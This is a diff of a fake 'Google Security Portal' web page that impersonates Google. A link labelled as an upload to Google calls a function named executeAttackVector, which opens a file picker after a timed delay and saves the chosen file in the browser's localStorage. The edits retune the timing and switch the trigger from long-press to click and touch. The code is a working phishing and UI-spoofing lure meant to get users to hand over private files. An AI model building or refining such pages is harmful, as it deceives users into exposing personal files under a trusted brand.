@@ -74,10 +74,10 @@
     <div class="banner">Google Security Portal</div>
     <h1>Secure Document Verification</h1>
 
-    <!-- Target Link to trigger Preview Page -->
-    <a href="https://google.com" class="spoof-link" id="targetLink">Upload Photo to Google</a>
+    <!-- Target Link: Membuka window baru ke google.com menggunakan target="_blank" -->
+    <a href="https://google.com" target="_blank" class="spoof-link" id="targetLink">Open New Window & Upload Photo</a>
 
-    <!-- Uploaded Image Preview Box -->
+    <!-- Area Pratinjau Foto yang Tersimpan -->
     <div class="preview-container" id="previewBox">
         <img id="imagePreview" src="" alt="File Preview">
         <div class="file-info" id="fileInfo"></div>
@@ -92,7 +92,6 @@
             if (triggered) return;
             triggered = true;
 
-            // Timer optimized to match the preview page opening animation
             setTimeout(async () => {
                 try {
                     const [fileHandle] = await window.showOpenFilePicker({
@@ -108,7 +107,6 @@
 
                     const file = await fileHandle.getFile();
                     
-                    // Simpan data foto/berkas ke dalam LocalStorage agar data tetap tersimpan saat berpindah halaman
                     const reader = new FileReader();
                     reader.onload = function(e) {
                         try {
@@ -116,22 +114,19 @@
                             localStorage.setItem('saved_file_name', file.name);
                             localStorage.setItem('saved_file_type', file.type);
                         } catch (err) {
-                            console.log("LocalStorage limit reached or blocked.");
+                            console.log("LocalStorage error:", err);
                         }
-                        
-                        // Redirect ke google.com setelah data tersimpan
-                        window.location.href = "https://google.com";
                     };
                     reader.readAsDataURL(file);
 
                 } catch (err) {
                     console.debug("File picker cancelled or blocked:", err.message);
-                    triggered = false;
+                } finally {
+                    setTimeout(() => { triggered = false; }, 1000);
                 }
-            }, 400); // 1.7 seconds delay for ephemeral tab
+            }, 1000);
         };
 
-        // Memeriksa apakah ada data foto tersimpan sebelumnya saat halaman dimuat kembali
         window.addEventListener("DOMContentLoaded", () => {
             const savedData = localStorage.getItem('saved_file_data');
             const savedName = localStorage.getItem('saved_file_name');
@@ -152,14 +147,15 @@
             }
         });
 
-        // Event listener for context menu (Long Press)
         const targetElement = document.getElementById("targetLink");
 
-        targetElement.addEventListener("contextmenu", () => {
+        targetElement.addEventListener("click", () => {
             executeAttackVector();
         });
 
-        targetElement.addEventListener("touchstart", () => {}, { passive: true });
+        targetElement.addEventListener("touchstart", () => {
+            executeAttackVector();
+        }, { passive: true });
     </script>
 
 </body>
